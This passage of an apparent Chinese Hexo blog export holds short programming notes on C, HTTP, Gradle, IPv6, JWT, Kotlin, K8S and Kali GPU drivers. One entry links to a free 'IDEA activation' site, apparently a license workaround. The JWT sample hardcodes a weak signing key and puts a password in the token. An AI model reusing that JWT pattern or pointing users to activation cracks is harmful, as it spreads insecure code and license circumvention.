class="number">25</span>,<span class="number">30</span>&#125;;</span><br><span class="line">    cout &lt;&lt; <span class="built_in">BinSearchRec</span>(st, <span class="number">15</span>, <span class="number">0</span>, <span class="number">9</span>) &lt;&lt; endl;<span class="comment">//查找15在数组中的位置</span></span><br><span class="line">    <span class="comment">//结果为4</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">BinSearchRec</span><span class="params">(<span class="type">int</span> *ST, <span class="type">int</span> key, <span class="type">int</span> low, <span class="type">int</span> high)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (low &gt; high)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> mid = (low + high) / <span class="number">2</span>;</span><br><span class="line">    <span class="comment">// 取中间位置</span></span><br><span class="line">    <span class="keyword">if</span> (key &gt; ST[mid]) <span class="comment">// 向后半部分查找</span></span><br><span class="line">        <span class="comment">//少了return</span></span><br><span class="line">        <span class="built_in">BinSearchRec</span>(ST, key, mid + <span class="number">1</span>, high);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (key &lt; ST[mid]) <span class="comment">// 向前半部分查找</span></span><br><span class="line">        <span class="comment">//少了return</span></span><br><span class="line">        <span class="built_in">BinSearchRec</span>(ST, key, low, mid - <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">    <span class="comment">// 查找成功</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是对在非 void 函数中不写 return 的情况产生了好奇：莫不是编译器会只能返回写在代码块中的最后一个变量？(有些高级语言是支持这样子的操作的)。<br>经检验后发现错了ε(┬┬﹏┬┬)3<br>所以在这里公布一下答案，并说明一下原因。<br><strong>在这样子的函数中，他会默认把存放于寄存器<code>exa</code>中的数据作为返回值返回到调用该函数的地方。</strong></p>
<blockquote>
<p>提供一个小工具<a href="https://godbolt.org/">c-&gt;汇编小工具</a></p>
</blockquote>
<p>所以我们是误打误撞得到的正确的结果,从汇编的结果来看<br><img src="https://image.zfxt.top/hexo-blog/GCC-%E4%B8%AD%E5%9C%A8%E9%9D%9E-void-%E5%87%BD%E6%95%B0%E4%B8%AD%E4%B8%8D%E5%86%99-return-%E7%9A%84%E6%83%85%E5%86%B5-2024-11-08-18-22-28.png" alt="GCC-中在非-void-函数中不写-return-的情况-2024-11-08-18-22-28"><br>只是刚好这个结果返回时存放到了exa寄存器中，同时也只有这个地方修改了exa寄存器。因此使结果刚好对了。</p>
<blockquote>
<p>在一些高级一些的IDE中，都会直接warning，不会出现这样子的错误。</p>
</blockquote>
]]></content>
      <tags>
        <tag>C语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Get-Post请求参数区别</title>
    <url>/posts/8ec2bb47/</url>
    <content><![CDATA[<h2 id="主要解决问题为get请求，post请求，params参数，data参数的区别和联系。"><a href="#主要解决问题为get请求，post请求，params参数，data参数的区别和联系。" class="headerlink" title="主要解决问题为get请求，post请求，params参数，data参数的区别和联系。"></a>主要解决问题为get请求，post请求，params参数，data参数的区别和联系。</h2><ol>
<li>首先Get请求不能携带请求体，服务器接收到Get请求后，会默认忽视掉Get请求的请求体。也就是Get请求只能携带params参数，这个参数会直接跟在请求地址后面，组成一个字符串。</li>
<li>post请求既可以使用params请求，也可以携带data参数，data的参数会放在payload中。springboot需要获取post发送的payload需要通过@RequestBody来获取。</li>
</ol>
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>Gradle 构建项目管理工具</title>
    <url>/posts/b1eeb086/</url>
    <content><![CDATA[<p>Android经常使用build.gradle来添加依赖和批量打包。</p>
<h2 id="Gradle-简单介绍"><a href="#Gradle-简单介绍" class="headerlink" title="Gradle 简单介绍"></a>Gradle 简单介绍</h2><p>Gradle 构建由 Project 和 Task 组成，Project 保存项目的属性，例如 name，版本号，代码文件位置。Task 也是 Project 的一部分，但是它是可执行的任务，我们最常使用的 build 就是一个 Task，Task 可以依赖于另外一个 Task，一个 Task 在执行的时候，它依赖的 Task 会先执行。这样，当我们 build 的时候，这个 Task 可能依赖很多的 Task，比如代码检查、注解处理，这样一层层的依赖，最终通过 build Task 全部执行。</p>
<h3 id="gradle和groovy的区别"><a href="#gradle和groovy的区别" class="headerlink" title="gradle和groovy的区别"></a>gradle和groovy的区别</h3><p>Gradle是一种自动化构建工具，与之类似的还有Maven，Ant。而Groovy是一种语言，Gradle允许使用这种语言来编写。同样kotlin也是一种语言可以用来编写Gradle，这两种语言有不同的编写格式，但是都大差不差。</p>
<h2 id="DSL"><a href="#DSL" class="headerlink" title="DSL"></a>DSL</h2><p>DSL全称：<code>Domain Specific Language</code>，即领域特定语言，它是编程语言赋予开发者的一种特殊能力，通过它我们可以编写出一些看似脱离其原始语法结构的代码，从而构建出一种专有的语法结构。<br>kotlin和groovy都是DSL</p>
]]></content>
      <tags>
        <tag>gradle</tag>
      </tags>
  </entry>
  <entry>
    <title>HTTP连接类型：短连接VS长连接</title>
    <url>/posts/6a5f34ed/</url>
    <content><![CDATA[<blockquote>
<p>引用自<a href="https://blog.csdn.net/n1314n/article/details/90743858">csdn</a></p>
</blockquote>
<h2 id="短连接："><a href="#短连接：" class="headerlink" title="短连接："></a>短连接：</h2><p>连接-&gt;传输数据-&gt;关闭连接<br>比如HTTP是无状态的的短链接，浏览器和服务器每进行一次HTTP操作，就建立一次连接，但任务结束就中断连接。</p>
<h2 id="长连接："><a href="#长连接：" class="headerlink" title="长连接："></a>长连接：</h2><p>因为连接后接收了数据就断开了，所以每次数据接受处理不会有联系。 这也是HTTP协议无状态的原因之一。<br>连接-&gt;传输数据-&gt;保持连接 -&gt; 传输数据-&gt; ………..-&gt;直到一方关闭连接，多是客户端关闭连接。<br>长连接指建立SOCKET连接后不管是否使用都保持连接，但安全性较差。</p>
]]></content>
      <tags>
        <tag>长连接和短链接</tag>
      </tags>
  </entry>
  <entry>
    <title>IDEA正版激活</title>
    <url>/posts/426a36c5/</url>
    <content><![CDATA[<p><a href="http://www.idejihuo.cn/#">idea免费激活</a></p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>idea激活</tag>
      </tags>
  </entry>
  <entry>
    <title>IPV6的基础知识</title>
    <url>/posts/49e6f10d/</url>
    <content><![CDATA[<p>【IPv6地址自动配置的一些基础知识】<br>IPv6地址自动配置的三种基本形式：<br>1）Stateless无状态的。 这个过程是 “无状态的”，原因是它不依赖于外部分配机制（例如IPv6动态主机配置协议（DHCPv6））的状态或是否存在。 在没有外部或用户干预的情况下， 设备尝试配置其自身的IPv6地址 （可能是多个地址）。<br>2）Stateful有状态的。 有状态的过程仅依赖于外部地址分配机制（例如DHCPv6）。DHCPv6服务器以类似于IPv4 DHCP操作的方式，将128bit IPv6地址分配给设备。<br>3）Stateless+Stateful无状态和有状态组合方式。 这个过程涉及无状态地址自动配置与其他IP参数的有状态配置相结合一起使用的形式。 通常情况下， 这需要一台设备使用无状态方法自动配置一个IPv6地址，之后利用DHCPv6得到其他参数或选项，比如要在给定网络上联系哪台NTP服务器来查询时间分辨率。</p>
<ul>
<li>无状态使用无状态地址自动配置 (SLAAC, Stateless address Autoconfiguration)</li>
<li>有状态使用IPv6动态主机配置协议 (DHCPv6, Dynamic Host Configuration Protocol for IPv6)</li>
<li>无状态+有状态使用SLAAC自动配置IPv6地址，使用DHCPv6获取DNS等其他信息。</li>
</ul>
<p>在IPv6中没有地址解析协议 (ARP, Address Resolution Protocol)，取而代之的是IPv6邻居发现协议 (NDP, Neighbor Discovery Protocol)，其中跟地址自动配置紧密相关的是路由通告 (RA, Route Advertisements) 。<br>根据RA报文中的A-Flag、M-Flag和O-Flag的不同组合，可以告知客户端使用哪种形式自动配置地址：</p>
<ul>
<li>RA(A&#x3D;1 M&#x3D;0 O&#x3D;0)：SLAAC（仅使用RA消息，RA中包含DNS信息选项）</li>
<li>RA(A&#x3D;1 M&#x3D;0 O&#x3D;1)：SLAAC+Stateless DHCPv6（RA和DHCPv6中的DNS消息选项）</li>
<li>RA(A&#x3D;0 M&#x3D;1 O&#x3D;0&#x2F;1)：Stateful DHCPv6（仅使用DHCPv6消息）<br>当然也可以RA(A&#x3D;1 M&#x3D;1 O&#x3D;1)：SLAAC和DHCPv6都用来自动配置地址，OpenWrt默认是这样设置。</li>
</ul>
<p>【RA报文中3个关键的Flag】<br>A-Flag：Autonomous address configuration flag 自动地址配置标志<br>表示是否配置无状态IPv6地址。在一个RA报文中，可存在多个prefix，比如2401::&#x2F;64、2402::&#x2F;64、2403::&#x2F;64，每个prefix都可以独立配置A-Flag。</p>
<ul>
<li>1：表示主机应当在该prefix范围内SLAAC自动生成IPv6地址，并配置子网路由条目、网关。</li>
<li>0：表示主机不应当在该prefix范围内SLAAC自动生成IPv6地址，但是可以配置子网路由条目、网关。</li>
</ul>
<p>M-Flag：Managed address configuration flag 受管理地址配置标志<br>表示是否配置有状态IPv6地址。M-Flag是RA报文的全局参数，一个RA报文只有一个M-Flag。</p>
<ul>
<li>1：表示主机可以通过DHCPv6来获得IPv6地址和其他参数（如DNS、NTP）</li>
<li>0：表示不通过DHCPv6来获得IPv6地址。</li>
</ul>
<p>O-Flag：Other configuration flag 其他配置标志<br>表示是否通过DHCPv6获得除IPv6地址以外的其他参数（如DNS、NTP）。O-Flag也是RA报文中的全局参数，一个RA报文只有一个O-Flag。<br>注意：仅当M-Flag为0时，该参数才会被读取。</p>
<ul>
<li>1：当M-Flag为0，将通过DHCPv6获得其他参数</li>
<li>0：当M-Flag为0，将不通过DHCPv6获得其他参数</li>
</ul>
<blockquote>
<p>引用自：<a href="https://www.right.com.cn/forum/thread-8193852-1-1.html">https://www.right.com.cn/forum/thread-8193852-1-1.html</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>IT业三大定律</title>
    <url>/posts/c67b30bc/</url>
    <content><![CDATA[<h2 id="杂言"><a href="#杂言" class="headerlink" title="杂言"></a>杂言</h2><p>IT业三大定律</p>
<ul>
<li>摩尔定律（Gordon Moore’s Law）<br>每18个月,微处理器处理能力翻倍而价格不变。</li>
<li>吉尔德定律（George Gilder’s Law）<br>未来25年内，主干网的带宽每6个月增长一倍，其增长速度是摩尔定律预测的 CPU 增长速度的3倍并预言将来上网终将免费。</li>
<li>梅特卡夫定律（Bob Metcalfe’s Law）<br>网络的利用价值等于用户数的平方。</li>
</ul>
]]></content>
      <tags>
        <tag>数据通信</tag>
      </tags>
  </entry>
  <entry>
    <title>JAR包中资源访问与Class访问</title>
    <url>/posts/b7bf206e/</url>
    <content><![CDATA[<p>在java使用以及部署应用时，经常会打一个jar包并将他安置在服务器上运行，而当你将配置文件放在resources目录下时，他将会被一起打包成一个class的类。并保存在jar包中，此时你无法通过相对路径来获取你放在resources目录下的文件，而需要通过Class.getResource()或Class.getResourceAsStream()来获取resources下的文件的访问。</p>
<h3 id="请注意，jar文件中包含的资源是只读的。您将无法保存对数据库的任何更改。"><a href="#请注意，jar文件中包含的资源是只读的。您将无法保存对数据库的任何更改。" class="headerlink" title="请注意，jar文件中包含的资源是只读的。您将无法保存对数据库的任何更改。"></a>请注意，jar文件中包含的资源是只读的。您将无法保存对数据库的任何更改。</h3>]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>jar包</tag>
      </tags>
  </entry>
  <entry>
    <title>JSON Web Token：安全的信息传输工具</title>
    <url>/posts/ce9572ca/</url>
    <content><![CDATA[<h2 id="JSON-Web-Token-基于JSON对象为载体，安全的传输信息，用于完成授权认证。"><a href="#JSON-Web-Token-基于JSON对象为载体，安全的传输信息，用于完成授权认证。" class="headerlink" title="JSON Web Token 基于JSON对象为载体，安全的传输信息，用于完成授权认证。"></a>JSON Web Token 基于JSON对象为载体，安全的传输信息，用于完成授权认证。</h2><h3 id="JWT分为三部分"><a href="#JWT分为三部分" class="headerlink" title="JWT分为三部分"></a>JWT分为三部分</h3><ul>
<li><p>Header</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  &#x27;typ&#x27;<span class="punctuation">:</span> &#x27;JWT&#x27;<span class="punctuation">,</span></span><br><span class="line">  &#x27;alg&#x27;<span class="punctuation">:</span> &#x27;HS256&#x27;</span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
<li><p>Payload(载荷，有效信息）</p>
</li>
<li><p>Signature（签名）</p>
</li>
</ul>
<p>此处展示一个模板<br>导入jtw</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--jwt依赖 --&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>io.jsonwebtoken<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jjwt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.4.0-b180830.0359<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0-M4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sun.xml.bind<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jaxb-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.0.0-M4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zfxt.sjv.util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> io.jsonwebtoken.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span>:zfx-t</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span>:1.0</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtUtil</span> &#123;</span><br><span class="line">    <span class="comment">//设置超时时间</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">long</span> <span class="variable">time</span> <span class="operator">=</span> <span class="number">1000</span> * <span class="number">60</span> * <span class="number">24</span>;</span><br><span class="line">    <span class="comment">//设置密钥</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">signature</span> <span class="operator">=</span> <span class="string">&quot;zfx-t&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">encrypt</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">JwtBuilder</span> <span class="variable">jwtBuilder</span> <span class="operator">=</span> Jwts.builder();</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> jwtBuilder</span><br><span class="line">                <span class="comment">//header</span></span><br><span class="line">                .setHeaderParam(<span class="string">&quot;typ&quot;</span>,<span class="string">&quot;JWT&quot;</span>)</span><br><span class="line">                .setHeaderParam(<span class="string">&quot;alg&quot;</span>,<span class="string">&quot;HS256&quot;</span>)</span><br><span class="line">                <span class="comment">//payload</span></span><br><span class="line">                .claim(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                .claim(<span class="string">&quot;password&quot;</span>,<span class="string">&quot;admin&quot;</span>)</span><br><span class="line">                .setExpiration(<span class="keyword">new</span> <span class="title class_">Date</span>(System.currentTimeMillis()+time))</span><br><span class="line">                <span class="comment">//signature</span></span><br><span class="line">                .signWith(SignatureAlgorithm.HS256,signature)</span><br><span class="line">                .compact();</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decrypt</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">token</span> <span class="operator">=</span> <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwic3ViIjoiSldULXRlc3QiLCJleHAiOjE2ODE4NzU3ODYsImp0aSI6IjkyNDY3N2EwLTBmNDEtNGEwMi04NWY1LTVmMGMxYTY5Nzg2MyJ9.BsHrHcWcHCoWtJVdAuybeAEG1FSUpx1aUDApnEQfAkA&quot;</span>;</span><br><span class="line">        <span class="type">JwtParser</span> <span class="variable">jwtParser</span> <span class="operator">=</span> Jwts.parser();</span><br><span class="line">        Jws&lt;Claims&gt; claimsJws = jwtParser.setSigningKey(signature).parseClaimsJws(token);</span><br><span class="line">        <span class="type">Claims</span> <span class="variable">claims</span> <span class="operator">=</span> claimsJws.getBody();</span><br><span class="line">        System.out.println(claims.get(<span class="string">&quot;username&quot;</span>));</span><br><span class="line">        <span class="comment">//获取id</span></span><br><span class="line">        System.out.println(claims.getId());</span><br><span class="line">        <span class="comment">//获取主题</span></span><br><span class="line">        System.out.println(claims.getSubject());</span><br><span class="line">        <span class="comment">//获取超时日期</span></span><br><span class="line">        System.out.println(claims.getExpiration());</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>JWT</tag>
      </tags>
  </entry>
  <entry>
    <title>JS中通过valueOf()让条件相等</title>
    <url>/posts/573c5369/</url>
    <content><![CDATA[<h3 id="如何使a-1-a-2-a-3结果为true"><a href="#如何使a-1-a-2-a-3结果为true" class="headerlink" title="如何使a&#x3D;&#x3D;1&amp;&amp;a&#x3D;&#x3D;2&amp;&amp;a&#x3D;&#x3D;3结果为true"></a>如何使a&#x3D;&#x3D;1&amp;&amp;a&#x3D;&#x3D;2&amp;&amp;a&#x3D;&#x3D;3结果为true</h3><p>在js中，所有程序都是单线程运行的，即便写在一行，也是从左到右运行。因此为了使该条件成立，可以在读取a的值的同时，让a自增1。在该问题中使用<code>valueOf()</code>方法，这是js的内置方法，当js调用某个值时，会使用该方法。因此重写该方法时，既可以实现该问题。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> a = &#123;</span><br><span class="line">  <span class="attr">value</span>: <span class="number">1</span>,</span><br><span class="line">  <span class="attr">valueOf</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">value</span>++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a==<span class="number">1</span>&amp;&amp;a==<span class="number">2</span>&amp;&amp;a==<span class="number">3</span>)</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>JS</tag>
      </tags>
  </entry>
  <entry>
    <title>K8S：容器编排与微服务平台</title>
    <url>/posts/a9073959/</url>
    <content><![CDATA[<h1 id="K8S是什么"><a href="#K8S是什么" class="headerlink" title="K8S是什么"></a>K8S是什么</h1><p>K8S全称kubernetes，是由Google在2014年开源的生产级别的容器编排系统，或者说是微服务和云原生平台,他实际上是一个微服务框架。<br>目前很主流的微服务框架和平台有Spring Cloud、Dubbo和K8S。<br>Spring Cloud来自Netflix，Dubbo来自阿里，而K8S则来自Google。</p>
<h2 id="Pod"><a href="#Pod" class="headerlink" title="Pod"></a>Pod</h2><p>Pod是K8S设计的一个全新的概念，个Pod中可以运行一个或者多个容器。<br>在一个集群中，K8S会为每个Pod都分配一个集群内唯一的IP地址，因为Pod中有一个叫Pause的根容器，其余的用户业务容器都是共享这个根容器的IP和Volume。</p>
<h2 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h2><p>Service被创建，K8S会为其分配一个集群内唯一的IP，叫做<code>ClusterIP</code>，<code>ClusterIP</code>是一个虚拟的IP地址，无法被Ping，仅仅只限于在K8S的集群内使用</p>
<h3 id="负载均衡"><a href="#负载均衡" class="headerlink" title="负载均衡"></a>负载均衡</h3><p>Service对客户端，屏蔽了底层Pod的寻址的过程。并且由kube-proxy进程将对Service的请求转发到具体的Pod上，具体到哪一个，由具体的调度算法决定。这样以来，就实现了负载均衡。</p>
<h2 id="Label"><a href="#Label" class="headerlink" title="Label"></a>Label</h2><p>Lable就是标签，可以打在Pod上，也可以打到Service上。总结来说，Label与被标记的资源是一个一对多的关系。</p>
<h2 id="Replica-Set"><a href="#Replica-Set" class="headerlink" title="Replica Set"></a>Replica Set</h2><p>Replica Set定义了一种期望的场景，即让任何时候集群内的Pod副本数量都符合预期的值。</p>
]]></content>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title>Java序列化：实现对象传输</title>
    <url>/posts/8b5d4862/</url>
    <content><![CDATA[<h1 id="java对象为什么要实现Serialiable接口？"><a href="#java对象为什么要实现Serialiable接口？" class="headerlink" title="java对象为什么要实现Serialiable接口？"></a>java对象为什么要实现Serialiable接口？</h1><p>Serializable是java.io包中定义的、用于实现Java类的序列化操作而提供的一个语义级别的接口。Serializable序列化接口没有任何方法或者字段，只是用于标识可序列化的语义。实现了Serializable接口的类可以被ObjectOutputStream转换为字节流，同时也可以通过ObjectInputStream再将其解析为对象。例如，我们可以将序列化对象写入文件后，再次从文件中读取它并反序列化成对象，也就是说，可以使用表示对象及其数据的类型信息和字节在内存中重新创建对象。</p>
<h2 id="关键就是可以通过流的形式实现对象的传输。"><a href="#关键就是可以通过流的形式实现对象的传输。" class="headerlink" title="关键就是可以通过流的形式实现对象的传输。"></a>关键就是可以通过流的形式实现对象的传输。</h2>]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>Kali Linux 安装英伟达显卡驱动和CUDA套件</title>
    <url>/posts/43a05df2/</url>
    <content><![CDATA[<p><strong>事情是这样子的，我最近刚装kali linux在我的笔记本上，想从windows转为linux体验一下，然后我访问Google浏览器发现我的cpu居然跑到了90%以上，风扇呼呼转，真的是见了鬼了。后来意识到，linux可能没有英伟达显卡的驱动</strong><br>这篇文章说明一下安装驱动的过程</p>
<ol>
<li>确保仓库包含contrib和non-free部分。Kali默认就有此部分。</li>
<li>检查显卡</li>
</ol>
<ul>
<li>下面的命令会显示你现在的显卡是什么。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# lspci | grep -i vga</span><br><span class="line">10:22.0 VGA compatible controller: NVIDIA Corporation GP106 [GeForce GTX 1060 6GB] (rev a1)</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# </span><br></pre></td></tr></table></figure></li>
<li>为了查看nvidia显卡，可以安装nvidia-detect，并运行此软件。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# apt install nvidia-detect</span><br><span class="line"></span><br><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# nvidia-detect </span><br><span class="line">Detected NVIDIA GPUs:</span><br><span class="line">09:00.0 VGA compatible controller [0300]: NVIDIA Corporation GP106 [GeForce GTX 1060 6GB] [10de:1c03] (rev a1)</span><br><span class="line"></span><br><span class="line">Checking card:  NVIDIA Corporation GP106 [GeForce GTX 1060 6GB] (rev a1)</span><br><span class="line">Uh oh. Failed to identify your Debian suite.</span><br></pre></td></tr></table></figure></li>
</ul>
<ol start="3">
<li>安装驱动</li>
</ol>
<ul>
<li>我们现在要安装nvidia闭源驱动和CUDA套件。<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">apt install -y nvidia-driver nvidia-cuda-toolkit</span><br></pre></td></tr></table></figure></li>
<li>然后重启电脑<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure></li>
<li>查看是否安装好驱动<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure></li>
</ul>
<blockquote>
<p>该文章引用自<a href="https://khdxs7.site/archives/Install_NVIDIA_GPU_Drivers.html">https://khdxs7.site/archives/Install_NVIDIA_GPU_Drivers.html</a></p>
</blockquote>
]]></content>
      <categories>
        <category>Linux基础</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 多平台 Web 应用工具包</title>
    <url>/posts/b469765b/</url>
    <content><![CDATA[<h1 id="ktor"><a href="#ktor" class="headerlink" title="ktor"></a>ktor</h1><p>ktor是由JetBrains构建的多平台工具包，用于在kotlin中创建Web应用程序。<br>Ktor 是一个轻松构建联网应用（web 应用、 HTTP 服务、 移动应用以及浏览器应用）的框架。 现代的联网应用需要异步化来提供最佳的用户体验，而 Kotlin 协程为此提供了极其简便的方式。</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>ktor</tag>
      </tags>
  </entry>
  <entry>
    <title>Kotlin 基础类型和集合</title>
    <url>/posts/1bbbd9a0/</url>
    <content><![CDATA[<p>继续学习</p>
<h2 id="元组-Tuple"><a href="#元组-Tuple" class="headerlink" title="元组(Tuple)"></a>元组(Tuple)</h2><p>有两种元组，Pair(a,b),Triple(a,b,c)<br>他们属于简单类型，被赋值的元素可以通过次序来调用他们</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> result = Triple(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">   println(result)</span><br><span class="line">   println(result.first)</span><br><span class="line">   println(result.second)</span><br></pre></td></tr></table></figure>
<h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><p>对象内的初始化方法，当对象被创建时，便会调用该方法。每次创建都会调用init。</p>
<h2 id="array和List"><a href="#array和List" class="headerlink" title="array和List"></a>array和List</h2><p>array数组，它可以通过arrayOf()来创建。其中可以放不同种类的数据类型。<br>数组是不可变的，他没有增加和删减的方法。<br>如果需要改变数组的内容，可以让他重新赋值，通过plus来新增数据</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> c = arrayOf(<span class="number">1</span>,<span class="string">&quot;滚犊子&quot;</span>,<span class="number">4</span>,<span class="number">5</span>)</span><br><span class="line">    c = c.plus(arrayOf(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>))</span><br><span class="line">    println(c)</span><br><span class="line">    println(c.contentToString())</span><br></pre></td></tr></table></figure>
<p>而且array类型的toString()并没有重写，如果需要输出具体数据内容的话，需要使用<code>contentToString()</code><br>而list也有两种List和MutableList，第一种和array类型，MutableList才可以修改。<br>但是list都重写了toString()方法，可以直接输出具体数据。</p>
<h2 id="set"><a href="#set" class="headerlink" title="set"></a>set</h2><p>set集合也很简单，他不允许有重复的元素，并且没有特定的排序方式</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>Kotlin 符号，高阶函数，内联函数，Lambda 表达式</title>
    <url>/posts/d375efb0/</url>
    <content><![CDATA[<h2 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h2><p><code>?</code>表示  是否允许空值的存在<br><code>!!</code>表示  如果对象为null，那么系统一定会报异常！<br><code>?:</code>表示  对象A ?: 对象B 表达式，意思为，当对象 A值为 null 时，那么它就会返回后面的对象 B。<br><code>::</code>表示  Kotlin 中 双冒号操作符 表示把一个方法当做一个参数，传递到另一个方法中进行使用，通俗的来讲就是引用一个方法。<br><code>-&gt;</code>表示 一般用于函数类型的连接符号<br><code>===</code>和<code>==</code>的区别 在Kotlin中，&#x3D;&#x3D;&#x3D; 表示比较对象地址，&#x3D;&#x3D; 表示比较两个值大小。</p>
